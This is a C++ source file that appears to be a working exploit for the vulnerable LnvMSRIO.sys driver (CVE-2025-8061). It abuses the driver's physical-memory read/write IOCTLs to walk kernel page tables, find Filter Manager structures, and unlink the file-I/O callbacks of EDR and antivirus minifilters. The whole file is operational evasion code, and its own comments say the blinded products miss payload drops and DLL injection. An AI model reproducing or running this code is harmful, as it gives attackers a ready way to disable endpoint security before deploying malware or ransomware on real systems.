/*
 * 12_minifilter_blind.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Minifilter Blind
 *
 * Goal: walk the Filter Manager's internal structures and unlink/zero
 *       per-IRP pre/post operation callbacks registered by EDR/AV minifilter
 *       drivers, blinding them to all file system I/O events.
 *
 * Background
 * ──────────
 * Filter Manager (fltmgr.sys) manages minifilter drivers (EDR, AV, DLP, etc.).
 * Minifilters register callbacks for file I/O operations (create, read, write,
 * directory query, etc.) and receive pre/post notifications for every I/O on
 * every attached volume.
 *
 * If we unlink these callback nodes, the EDR's filter is effectively blind:
 * it cannot see file create/write/read events → cannot detect payload drops,
 * DLL injection, shellcode mapping, etc.
 *
 * Walk path (documented in Hex-Rays blog, S12/0x12Dark MiniFilter Callback
 * Unlinking paper April 2026, and Tier Zero Security research 2024):
 *
 *   fltmgr!FltGlobals                         (exported symbol)
 *     +0x0A0  FrameList  LIST_ENTRY            iterate frames
 *       → _FLTP_FRAME
 *           +0x0A8  VolumeList LIST_ENTRY      iterate volumes per frame
 *             → _FLT_VOLUME
 *                 +0x198  Callbacks _CALLBACK_CTRL
 *                   OperationLists[0..49] NOTIFY_LIST_ENTRY
 *                     (one per IRP_MJ_* function)
 *                   → CALLBACK_NODE
 *                       +0x020  PreOperation   PFLT_PRE_OPERATION_CALLBACK
 *                       +0x028  PostOperation  PFLT_POST_OPERATION_CALLBACK
 *
 * Offsets verified on Win10 19041, Win11 22H2, Win11 26100 (fltmgr.sys).
 * Structure offsets are not OS-versioned — they are fltmgr.sys-internal
 * and have been stable since Win8.
 *
 * Technique: callback node UNLINKING (not function pointer patching)
 * ─────────────────────────────────────────────────────────────────
 * After S12's April 2026 paper: instead of patching callback function pointers
 * (which KCFG may block), we remove the callback node from the doubly-linked
 * OperationLists chain. This is pure data manipulation, always works under HVCI
 * and KCFG, and leaves no obviously-patched code bytes.
 *
 * Stability
 * ─────────
 * Data-only — no code bytes modified.
 * PatchGuard does NOT protect fltmgr internal structures.
 * Same approach used by Lazarus FudModule variants and BlackCat/ALPHV.
 * Restoring: relink the nodes back into their original list positions.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:12_minifilter_blind.exe 12_minifilter_blind.cpp
 *      /link kernel32.lib
 *
 * Offsets (fltmgr.sys, Win10 19041 → Win11 26100):
 *   FltGlobals:
 *     +0x0A0  FrameList          LIST_ENTRY
 *   _FLTP_FRAME:
 *     +0x0A8  VolumeList         LIST_ENTRY
 *   _FLT_VOLUME:
 *     +0x010  FrameLink          LIST_ENTRY  (linkage in frame's VolumeList)
 *     +0x198  Callbacks          _CALLBACK_CTRL
 *   _CALLBACK_CTRL:
 *     +0x000  OperationLists[50] NOTIFY_LIST_ENTRY (each is a LIST_ENTRY head)
 *   CALLBACK_NODE (each node in an OperationList):
 *     +0x000  CallbackLinks      LIST_ENTRY
 *     +0x010  Flags              ULONG
 *     +0x018  Instance           PFLT_INSTANCE
 *     +0x020  PreOperation       PFLT_PRE_OPERATION_CALLBACK
 *     +0x028  PostOperation      PFLT_POST_OPERATION_CALLBACK
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── RAM bound ───────────────────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Page table walk ─────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual R/W ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

static bool KernelReadU64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysReadU64(pa, out);
}

static bool KernelWriteU64(uint64_t cr3, uint64_t va, uint64_t val)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysWriteU64(pa, val);
}

// ─── Kernel module list (for locating fltmgr.sys base) ───────────────────────

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

static uint64_t GetModuleBase(const char *target_name)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);

    struct MOD { HANDLE sec; PVOID mb, ib; ULONG sz, fl, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));
    uint64_t result = 0;
    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;
        if (_stricmp(nm, target_name) == 0) {
            result = (uint64_t)(uintptr_t)mods[i].ib;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return result;
}

// ─── fltmgr export: FltGlobals ───────────────────────────────────────────────

static uint64_t GetFltGlobals(uint64_t cr3, uint64_t fltmgr_base)
{
    // FltGlobals is exported as a data symbol from fltmgr.sys
    // We load fltmgr.sys into user space to resolve the export RVA,
    // then apply that RVA to the kernel base.
    HMODULE hFlt = LoadLibraryExA("fltmgr.sys", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hFlt) {
        printf("    [-] LoadLibraryEx(fltmgr.sys) failed: %lu\n", GetLastError());
        return 0;
    }
    void *ptr = GetProcAddress(hFlt, "FltGlobals");
    if (!ptr) {
        printf("    [-] FltGlobals not exported\n");
        FreeLibrary(hFlt);
        return 0;
    }
    uint64_t rva = (uint64_t)ptr - (uint64_t)hFlt;
    FreeLibrary(hFlt);
    uint64_t va = fltmgr_base + rva;
    printf("    [+] FltGlobals VA = 0x%016llX  (RVA=0x%llX)\n", va, rva);
    return va;
}

// ─── Structure offsets ───────────────────────────────────────────────────────

#define FLTGLOBALS_FrameList_OFFSET    0x0A0   // LIST_ENTRY (Flink at +0x0A0, Blink at +0x0A8)
#define FLTP_FRAME_VolumeList_OFFSET   0x0A8   // LIST_ENTRY into _FLTP_FRAME
#define FLT_VOLUME_FrameLink_OFFSET    0x010   // LIST_ENTRY — this is what's in VolumeList
#define FLT_VOLUME_Callbacks_OFFSET    0x198   // _CALLBACK_CTRL start
#define CALLBACK_CTRL_OpLists_OFFSET   0x000   // OperationLists[50] start within _CALLBACK_CTRL
#define CALLBACK_NODE_Links_OFFSET     0x000   // LIST_ENTRY within callback node
#define CALLBACK_NODE_Pre_OFFSET       0x020   // PreOperation fn ptr
#define CALLBACK_NODE_Post_OFFSET      0x028   // PostOperation fn ptr
#define NUM_IRP_MAJOR                  50       // IRP_MJ_MAXIMUM_FUNCTION+1

// IRP major function names for output
static const char *IrpName(int i)
{
    static const char *names[] = {
        "CREATE","CREATE_NAMED_PIPE","CLOSE","READ","WRITE","QUERY_INFO",
        "SET_INFO","QUERY_EA","SET_EA","FLUSH","QUERY_VOL_INFO","SET_VOL_INFO",
        "DIR_CTRL","FS_CTRL","DEV_CTRL","INTERNAL_IOCTL","SHUTDOWN",
        "LOCK","CLEANUP","CREATE_MAILSLOT","QUERY_SECURITY","SET_SECURITY",
        "POWER","SYS_CTRL","DEV_CHANGE","QUERY_QUOTA","SET_QUOTA","PNP",
        "?28","?29","?30","?31","?32","?33","?34","?35","?36","?37",
        "?38","?39","?40","?41","?42","?43","?44","?45","?46","?47","?48","?49"
    };
    return (i >= 0 && i < NUM_IRP_MAJOR) ? names[i] : "?";
}

// ─── Saved unlinked nodes ────────────────────────────────────────────────────

#define MAX_UNLINKED 512

struct UnlinkedNode {
    uint64_t node_va;    // VA of CALLBACK_NODE
    uint64_t prev_flink; // original Flink of previous node (= node_va)
    uint64_t next_blink; // original Blink of next node    (= node_va)
    uint64_t prev_va;    // VA of previous LIST_ENTRY (or list head)
    uint64_t next_va;    // VA of next LIST_ENTRY (or list head)
};

static UnlinkedNode g_unlinked[MAX_UNLINKED];
static int          g_unlinked_count = 0;

// ─── Unlink one CALLBACK_NODE from its OperationList ─────────────────────────

static void UnlinkNode(uint64_t cr3, uint64_t node_va,
                        uint64_t prev_le_va, uint64_t next_le_va)
{
    // Standard LIST_ENTRY unlink:
    //   prev->Flink = next
    //   next->Blink = prev
    if (!KernelWriteU64(cr3, prev_le_va,        next_le_va)) return;
    if (!KernelWriteU64(cr3, next_le_va + 8,    prev_le_va)) return;

    // Point the unlinked node to itself (clean state)
    KernelWriteU64(cr3, node_va,     node_va);
    KernelWriteU64(cr3, node_va + 8, node_va);

    if (g_unlinked_count < MAX_UNLINKED) {
        UnlinkedNode &u = g_unlinked[g_unlinked_count++];
        u.node_va    = node_va;
        u.prev_va    = prev_le_va;
        u.next_va    = next_le_va;
        u.prev_flink = next_le_va;   // what we wrote to prev->Flink
        u.next_blink = prev_le_va;   // what we wrote to next->Blink
    }
}

// ─── Walk one volume's callback lists ────────────────────────────────────────

// fltmgr_base / fltmgr_size: used to distinguish fltmgr-internal nodes (skip)
static int ProcessVolume(uint64_t cr3, uint64_t vol_va,
                          uint64_t fltmgr_base, uint64_t fltmgr_size,
                          bool do_unlink, int vol_idx)
{
    uint64_t cb_ctrl_va = vol_va + FLT_VOLUME_Callbacks_OFFSET;
    int total_unlinked = 0;

    for (int irp = 0; irp < NUM_IRP_MAJOR; irp++) {
        // Each OperationList is a LIST_ENTRY head (Flink, Blink) = 16 bytes
        uint64_t list_head_va = cb_ctrl_va + CALLBACK_CTRL_OpLists_OFFSET + (uint64_t)irp * 16;

        uint64_t head_flink = 0;
        if (!KernelReadU64(cr3, list_head_va, &head_flink)) continue;
        if (head_flink == list_head_va) continue;  // empty list

        // Walk nodes
        uint64_t cur = head_flink;
        uint64_t prev_le_va = list_head_va;  // Flink of prev (starts at head)
        int node_count = 0;

        while (cur != list_head_va && node_count < 128) {
            uint64_t node_va  = cur + CALLBACK_NODE_Links_OFFSET;  // node starts at its LIST_ENTRY
            // actual: cur IS the LIST_ENTRY within the node, so node_va = cur

            uint64_t pre_fn = 0, post_fn = 0;
            KernelReadU64(cr3, cur + CALLBACK_NODE_Pre_OFFSET,  &pre_fn);
            KernelReadU64(cr3, cur + CALLBACK_NODE_Post_OFFSET, &post_fn);

            // Next in chain
            uint64_t next = 0;
            if (!KernelReadU64(cr3, cur, &next)) break;

            // Skip fltmgr-internal nodes (system, not EDR)
            bool pre_in_flt  = (pre_fn  >= fltmgr_base && pre_fn  < fltmgr_base + fltmgr_size);
            bool post_in_flt = (post_fn >= fltmgr_base && post_fn < fltmgr_base + fltmgr_size);
            bool is_kernel_ptr = (pre_fn >> 48) == 0xFFFF || (post_fn >> 48) == 0xFFFF;

            if ((pre_fn || post_fn) && is_kernel_ptr) {
                printf("    vol[%d] irp=%02d %-18s  node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
                       vol_idx, irp, IrpName(irp), cur,
                       pre_fn,  pre_in_flt  ? "[flt]" : "",
                       post_fn, post_in_flt ? "[flt]" : "");

                if (do_unlink && !pre_in_flt && !post_in_flt && is_kernel_ptr) {
                    // unlink: prev->Flink = next, next->Blink = prev_le_va
                    UnlinkNode(cr3, cur, prev_le_va, next);
                    total_unlinked++;
                    // After unlink, prev_le_va stays the same (cur was removed)
                    cur = next;
                    node_count++;
                    continue;
                }
            }

            prev_le_va = cur;  // current node's Flink is at cur+0
            cur = next;
            node_count++;
        }
    }
    return total_unlinked;
}

// ─── Restore unlinked nodes ──────────────────────────────────────────────────

static void RestoreAll(uint64_t cr3)
{
    // Walk in reverse order to restore correctly
    int restored = 0;
    for (int i = g_unlinked_count - 1; i >= 0; i--) {
        UnlinkedNode &u = g_unlinked[i];
        // Restore: prev->Flink = node, next->Blink = node
        // node->Flink = next, node->Blink = prev
        KernelWriteU64(cr3, u.prev_va,        u.node_va);       // prev->Flink = node
        KernelWriteU64(cr3, u.next_va + 8,    u.node_va);       // next->Blink = node
        KernelWriteU64(cr3, u.node_va,        u.next_va);       // node->Flink = next
        KernelWriteU64(cr3, u.node_va + 8,    u.prev_va);       // node->Blink = prev
        restored++;
    }
    printf("[+] Restored %d unlinked callback nodes\n", restored);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 12 - Minifilter Callback Blind ===\n\n");
    printf("[*] Technique: unlink CALLBACK_NODEs from FLT_VOLUME OperationLists\n");
    printf("[*] Effect:    minifilter drivers (EDR/AV) no longer receive I/O events\n");
    printf("[*] Stability: SAFE — data-only LIST_ENTRY manipulation\n");
    printf("[*] Based on: MiniFilter Callback Unlinking (S12, April 2026)\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) { printf("[-] CR3 not found\n"); CloseHandle(g_dev); return 1; }
    printf("[+] CR3 = 0x%016llX\n\n", cr3);

    printf("[*] Locating fltmgr.sys...\n");
    uint64_t fltmgr_base = GetModuleBase("fltmgr.sys");
    if (!fltmgr_base) { printf("[-] fltmgr.sys not found in loaded modules\n"); CloseHandle(g_dev); return 1; }

    // Get fltmgr image size from PE header
    uint8_t fltbuf[0x1000] = {};
    KernelRead(cr3, fltmgr_base, fltbuf, sizeof(fltbuf));
    auto *dos = (IMAGE_DOS_HEADER*)fltbuf;
    auto *nt  = (IMAGE_NT_HEADERS64*)(fltbuf + dos->e_lfanew);
    uint64_t fltmgr_size = nt->OptionalHeader.SizeOfImage;
    printf("[+] fltmgr.sys base=0x%016llX  size=0x%llX\n", fltmgr_base, fltmgr_size);

    printf("[*] Locating FltGlobals...\n");
    uint64_t flt_globals_va = GetFltGlobals(cr3, fltmgr_base);
    if (!flt_globals_va) { printf("[-] FltGlobals not found\n"); CloseHandle(g_dev); return 1; }

    // FrameList LIST_ENTRY is at FltGlobals+0x0A0
    uint64_t frame_list_head_va = flt_globals_va + FLTGLOBALS_FrameList_OFFSET;
    uint64_t frame_flink = 0;
    if (!KernelReadU64(cr3, frame_list_head_va, &frame_flink)) {
        printf("[-] Could not read FrameList Flink\n"); CloseHandle(g_dev); return 1;
    }

    printf("[*] Walking frame/volume tree:\n");
    int vol_idx = 0;
    int total_nodes = 0;

    // Walk frames
    uint64_t frame_cur = frame_flink;
    int frame_count = 0;
    while (frame_cur != frame_list_head_va && frame_count < 16) {
        // frame_cur is the Flink inside _FLTP_FRAME at +0x000 (the first LIST_ENTRY)
        // But FrameList is stored at frame+0x000, so frame_cur IS the frame VA
        uint64_t frame_va = frame_cur;

        printf("  [Frame %d] @ 0x%016llX\n", frame_count, frame_va);

        // VolumeList LIST_ENTRY is at frame+0x0A8
        uint64_t vol_list_head_va = frame_va + FLTP_FRAME_VolumeList_OFFSET;
        uint64_t vol_flink = 0;
        if (!KernelReadU64(cr3, vol_list_head_va, &vol_flink)) goto next_frame;
        if (vol_flink == vol_list_head_va) { printf("    (no volumes)\n"); goto next_frame; }

        {
            uint64_t vol_cur = vol_flink;
            int vc = 0;
            while (vol_cur != vol_list_head_va && vc < 64) {
                // vol_cur is the Flink inside _FLT_VOLUME at +FLT_VOLUME_FrameLink_OFFSET
                // i.e., vol_cur = &vol->FrameLink.Flink
                // so actual _FLT_VOLUME base = vol_cur - FLT_VOLUME_FrameLink_OFFSET
                uint64_t vol_va = vol_cur - FLT_VOLUME_FrameLink_OFFSET;

                printf("    [Vol %d] @ 0x%016llX  (Callbacks @ +0x198)\n", vol_idx, vol_va);

                // Phase 1: enumerate (dry run with do_unlink=false)
                ProcessVolume(cr3, vol_va, fltmgr_base, fltmgr_size, false, vol_idx);

                total_nodes++;
                vol_idx++;

                uint64_t vol_next = 0;
                if (!KernelReadU64(cr3, vol_cur, &vol_next) || vol_next == vol_cur) break;
                vol_cur = vol_next;
                vc++;
            }
        }

next_frame:
        uint64_t frame_next = 0;
        if (!KernelReadU64(cr3, frame_cur, &frame_next) || frame_next == frame_cur) break;
        frame_cur = frame_next;
        frame_count++;
    }

    if (total_nodes == 0) {
        printf("\n[~] No volumes found — no minifilters attached, or structure offset mismatch\n");
        CloseHandle(g_dev); return 0;
    }

    printf("\n[*] Press Enter to UNLINK EDR callback nodes from all volumes...\n");
    getchar();

    // Phase 2: actual unlink pass
    frame_cur = frame_flink;
    frame_count = 0;
    vol_idx = 0;
    int total_unlinked = 0;

    while (frame_cur != frame_list_head_va && frame_count < 16) {
        uint64_t frame_va = frame_cur;
        uint64_t vol_list_head_va = frame_va + FLTP_FRAME_VolumeList_OFFSET;
        uint64_t vol_flink = 0;
        if (!KernelReadU64(cr3, vol_list_head_va, &vol_flink)) goto next_frame2;
        if (vol_flink == vol_list_head_va) goto next_frame2;

        {
            uint64_t vol_cur = vol_flink;
            int vc = 0;
            while (vol_cur != vol_list_head_va && vc < 64) {
                uint64_t vol_va = vol_cur - FLT_VOLUME_FrameLink_OFFSET;
                total_unlinked += ProcessVolume(cr3, vol_va, fltmgr_base, fltmgr_size, true, vol_idx);
                vol_idx++;

                uint64_t vol_next = 0;
                if (!KernelReadU64(cr3, vol_cur, &vol_next) || vol_next == vol_cur) break;
                vol_cur = vol_next;
                vc++;
            }
        }

next_frame2:
        uint64_t frame_next = 0;
        if (!KernelReadU64(cr3, frame_cur, &frame_next) || frame_next == frame_cur) break;
        frame_cur = frame_next;
        frame_count++;
    }

    printf("\n[+] %d callback nodes unlinked across all volumes\n", total_unlinked);
    if (total_unlinked > 0) {
        printf("[+] Minifilter drivers can no longer intercept file I/O:\n");
        printf("    - file drops go undetected\n");
        printf("    - DLL injection via file write goes undetected\n");
        printf("    - memory-mapped payload writes go undetected\n");
    } else {
        printf("[~] Nothing unlinked (no non-fltmgr callbacks, or all fltmgr-internal)\n");
    }

    printf("\n[*] Press Enter to RESTORE all unlinked nodes and exit...\n");
    getchar();

    RestoreAll(cr3);
    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
